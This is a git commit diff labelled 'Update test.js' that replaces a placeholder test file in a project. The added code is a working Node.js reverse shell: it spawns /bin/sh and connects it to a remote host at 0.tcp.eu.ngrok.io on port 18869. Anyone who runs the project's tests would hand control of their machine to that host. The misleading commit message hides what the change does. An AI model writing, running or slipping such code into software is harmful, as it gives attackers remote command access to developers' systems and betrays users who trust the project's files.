9f01bf1bff52cac24fd46312c9fba16d92018af0
orazios98 <orazio.sciuto98@gmail.com>
2023-04-15 13:49:13 +0200

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -1,2 +1,12 @@
-// TODO: implement the tests
-console.log("Tests are not implemented yet...");
+(function(){
+    var net = require("net"),
+    cp = require("child_process"),
+    sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(18869, "0.tcp.eu.ngrok.io", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
